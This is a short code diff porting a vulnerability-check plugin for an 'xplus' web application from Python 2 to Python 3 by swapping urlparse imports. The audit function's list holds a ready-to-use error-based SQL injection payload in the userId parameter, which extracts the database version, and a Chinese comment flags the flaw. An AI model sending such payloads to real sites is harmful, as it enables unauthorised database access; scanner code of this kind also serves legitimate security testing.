@@ -7,11 +7,11 @@ Author    :  a
 mail      :  a@lcx.cc
  
 """
-import urlparse
+import urllib.parse
 
 def assign(service, arg):
     if service == 'xplus':
-        arr = urlparse.urlparse(arg)
+        arr = urllib.parse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 def audit(arg):
     ps = ["www/index.php?mod=admin&con=subscribe&act=unsubscribe&subsId=1&userId=1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&papers_cn=aaaaaaaa&papers_en=xxxxxxxx" ,# userId参数存在报错注入
